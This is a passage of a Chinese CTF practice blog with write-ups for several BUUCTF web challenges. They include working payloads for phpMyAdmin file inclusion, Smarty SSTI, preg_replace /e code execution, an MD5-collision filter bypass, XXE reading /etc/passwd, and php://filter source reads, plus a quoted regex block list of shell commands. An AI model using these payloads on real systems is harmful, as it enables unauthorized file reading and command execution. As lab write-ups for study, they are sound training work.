alt="image-20210808144253823"></p><p>由于array_rand是随机的，所以要多刷新几次才可能会显示flag.php的内容</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>御剑是真的不好用。。。phpmyadmin路径死活扫不出来</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808154118587.png" alt="image-20210808154118587"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150229023.png" alt="image-20210808150229023"></p><p>这里phpmyadmin版本是4.8.1</p><p>由于phpmyadmin4.8.0-4.8.1存在文件包含漏洞</p><p>直接用payload打</p><p>?target=db_datadict.php%253f/../../../../../../../../flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150605205.png" alt="image-20210808150605205"></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>这道题第一眼看上去像是本地访问的题目</p><p>但是hint有感觉不太像</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808201950916.png" alt="image-20210808201950916"></p><p>抓包修改xff头后就没思路了，查了一下发现是smarty模板注入</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202158856.png" alt="image-20210808202158856"></p><p>看到这里支持逻辑运算，可以直接解析，所以就可以利用系统命令来读flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202307003.png" alt="image-20210808202307003"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202546370.png" alt="image-20210808202546370"></p><p><strong>Smarty SSTI利用</strong></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">(1条消息) PHP的模板注入（Smarty模板）_WHOAMIAnony的博客-CSDN博客_smarty模板注入</a></p><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p><p><strong>漏洞确认</strong></p><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202952019.png" alt="image-20210808202952019"></p><p><strong>常规利用方式</strong></p><p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。</p><p><strong>{literal} 标签</strong></p><blockquote><p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p></blockquote><p>若该题环境为php5，则可以</p><pre class="language-none"><code class="language-none">&lt;script&gt;language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</code></pre><p><strong>静态方法</strong></p><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p><p><strong>在3.1.30的Smarty版本中官方已经把该静态方法删除</strong></p><p><strong>{if}标签</strong><br>官方文档中看到这样的描述：</p><p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if}</em></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808203333956.png" alt="image-20210808203333956"></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>第一部分</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809002920929.png" alt="image-20210809002920929"></p><p>可以用伪协议读取，但是不知道为什么我用hackbar时没成功</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225403216.png" alt="image-20210808225403216"></p><p>也可以用这个payload</p><pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>base64解码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225453870.png" alt="image-20210808225453870"></p><p>当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。</p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><p>这里第二个参数固定为<code>strtolower(&quot;\\1&quot;)</code>这里的<code>\\1</code>实际上体现为<code>\1</code></p><p> <strong>\1</strong> 在正则表达式中有自己的含义:</p><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问</p><p>这里的\1指的是第一个匹配项</p><p>这里我们就要利用这个漏洞来运行getflag函数，并同时给cmd传参，利用system来执行命令</p><p>为了实现运行getflag的目的，就要先让\1为getflag(),也就是传入</p><p> .*={${getFlag()}}</p><pre class="language-none"><code class="language-none">原先的语句： preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;);</code></pre><p>这样通过preg_replace后就会运行getflag函数，但是由于php特性.传入后会变为_所以这里要利用正则匹配中的\S</p><p>所以传入的payload为\S*={${getFlag()}}</p><pre class="language-none"><code class="language-none">\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配</code></pre><p>最终payload为?\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;);</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809001841771.png" alt="image-20210809001841771"></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。</p><p>接一下百度的wp的源码</p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;flag.php&#39;;$yds &#x3D; &quot;dog&quot;;$is &#x3D; &quot;cat&quot;;$handsome &#x3D; &#39;yds&#39;;foreach($_POST as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $$y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    exit($yds);&#125;if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>flag.php</p><pre class="language-none"><code class="language-none">&lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</code></pre><p>前两个<code>foreach</code>语句分别将<code>POST</code>参数和<code>GET</code>参数进行变量覆盖，接着是三个if语句，<code>exit()</code>函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。</p><p>首先我们想到的是让脚本执行到最后一句<code>echo $flag;</code>，但即使绕过三个if语句，我们<code>GET</code>传参或者<code>POST</code>传参的flag总会被变量覆盖：如我们<code>GET</code>传参flag=aaa，在第二个foreach语句中变成<code>$flag</code> = <code>$aaa</code>，而<code>$aaa</code>变量没有定义为空，最后的输出就是空</p><p>但是由于变量覆盖的原因最终不会显示flag</p><p>而<code>exit()</code>函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将<code>exit()</code>函数内的参数用<code>$flag</code>覆盖掉就能输出flag了；</p><p>所以我们可以借助后两个if语句中的exit来输出flag</p><p>当我们get yds=flag时，满足第二个if判断，而由于第一个foreach语句，$yds=$flag，所以最终就会变成exit($flag);</p><p>还可以借助第三个if语句，当我们get flag=flag&amp;is=flag后经过第二个foreach语句$flag=$flag，$is=$flag对flag自身无影响，又因为满足第三个if语句，也会输出flag值</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/113790063?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_Zero_Adam的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>进入后看到img参数像base64，解码两次再用16进制转字符串会变成555.png</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181026268.png" alt="image-20210811181026268"></p><p>所以为了想读取源码，我们将index.php按照相同的方式加密后变为</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>修改后替换img原来的值，发现依旧返回了一大串base64编码，解码后可获得源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181304356.png" alt="image-20210811181304356"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181317988.png" alt="image-20210811181317988"></p><p>重点：</p><pre class="language-none"><code class="language-none">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;</code></pre><p>先看第二个if里的md5的比较，传数组或者传md5值为0e开头的都没法绕过去</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/114494427">(1条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初 · mochu7-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的一些例子 - 简书 (jianshu.com)</a></p><p>从这两篇文章里能找到存在文件十六进制字节流数据的哈希值相等</p><p>再考虑到要将一些不可见字符传到服务器，这里可以使用url编码</p><p>最终</p><pre class="language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>这里要绕过两个if语句，然后执行cmd中的参数，所以可以利用反斜杠绕过，在正则表达式中三个反斜杠才能匹配到反斜杠，</p><p><a href="https://blog.csdn.net/weixin_41463193/article/details/83539168">(1条消息) 【PHP】之4个反斜杠、3个反斜杠的情况_Hertter的博客-CSDN博客</a></p><p><a href="https://www.thinbug.com/q/28062568">为什么3反斜杠在php中等于4反斜杠？ - Thinbug</a></p><p>题目里的正则其实有些问题，所以虽然存在了四个反斜杠但是依旧没有过滤掉反斜杠</p><p>贴个大佬的文章</p><p><a href="https://www.jianshu.com/p/076c5b422c96">从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com)</a></p><p>可以先用dir查看目录</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811185153589.png" alt="image-20210811185153589"></p><p>ca\t%20/flag来绕过第一个if</p><p>用\的原因是因为在linux下行尾输\可以换行并且继续输入命令</p><p>这里正则匹配漏了uniq和sort，用这俩也能拿到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190241730.png" alt="image-20210811190241730"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190251827.png" alt="image-20210811190251827"></p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>先抓包</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225117333.png" alt="image-20210811225117333"></p><p>发现有两个post的参数</p><p>然后根据报错的信息</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225205171.png" alt="image-20210811225205171"></p><p>这里用了call_user_func函数，也就是func是函数名，p是参数</p><p>用system试时发现被过滤了，发现file_get_contents函数可以用</p><p>file_get_contents拿源码</p><pre><code>&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>由于这个过滤不存在与test中，所以可以利用反序列化来执行命令</p><p>利用find命令来查找文件名中有flag的文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224457971.png" alt="image-20210811224457971"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224439715.png" alt="image-20210811224439715"></p><p>最后用file_get_contents来查看文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224611612.png" alt="image-20210811224611612"></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>看到这题目第一眼就感觉是xxe漏洞，正好趁这个机会把xml学一下</p><p><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_52907838/article/details/118030007">NCTF2019]Fake XML cookbook_sgnbi~的博客-CSDN博客</a></p><p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a></p><blockquote><p>- XML被设计为传输和存储数据，其焦点是数据的内容。</p><p>- HTML被设计用来显示数据，其焦点是数据的外观。</p></blockquote><p>基本语法：</p><blockquote><p>- 所有 XML 元素都须有关闭标签。</p><p>- XML 标签对大小写敏感。</p><p>- XML 必须正确地嵌套。</p><p>- XML 文档必须有根元素。</p><p>- XML 的属性值须加引号。</p></blockquote><p>- 实体引用，如果你把字符 &quot;&lt;&quot; 放在 XML元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生XML错误：</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812002508519.png" alt="image-20210812002508519"></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的子元素，category为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--book的子元素，lang为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的结束--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的结束--></span></code></pre><p><strong>DTD</strong></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;&#x2F;to&gt;&lt;from&gt;@re&lt;&#x2F;from&gt;&lt;head&gt;v3ry&lt;&#x2F;head&gt;&lt;body&gt;g00d!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;</code></pre><p>当使用外部DTD时，通过如下语法引入。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"filename"</span><span class="token punctuation">></span></span></code></pre><p>外部DTD实例</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"test.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Y0u<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>@re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>v3ry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>g00d!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>test.dtd：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义to元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义from元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义head元素为”#PCDATA”类型--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--定义body元素为”#PCDATA”类型--></span></code></pre><p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><p><strong>内部实体示例代码</strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;&#x2F;test&gt;</code></pre><p><strong>外部实体示例代码</strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;&#x2F;author&gt;</code></pre><p><strong>XXE漏洞简介</strong></p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004625128.png" alt="image-20210812004625128"></p><p>通过各种协议可以实现xxe注入，例如利用file://来访问本地文件系统</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br><a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><p>简单的payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&lt;&#x2F;xml&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><strong>题解：</strong></p><p>抓包，能看出是用xml进行传输数据</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812003649956.png" alt="image-20210812003649956"></p><p>直接上payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004223242.png" alt="image-20210812004223242"></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>看这个url，试试伪协议读取</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163436662.png" alt="image-20210812163436662"></p><p>多了个php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163515084.png" alt="image-20210812163515084"></p><p>所以可以用这个来读源码?category=php://filter/read=convert.base64-encode/resource=index</p><p>base64解码后的重点</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$file &#x3D; $_GET[&#39;category&#39;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;include ($file . &#39;.php&#39;);&#125;else&#123;echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt;</code></pre><p>存在flag.php页面，之后就是想办法把他读出来</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163740442.png" alt="image-20210812163740442"></p><p>接下来有一个</p><p>php伪协议嵌套的知识点</p><p>PHP伪协议可以将某个文件或文件夹包含在php://filter/convert.base64-encode/resource=flag中。比如：php://filter/convert.base64-encode/<strong>index</strong>/resource=flag</p><p>这样就能绕过if的判断，读取flag文件</p><p><img 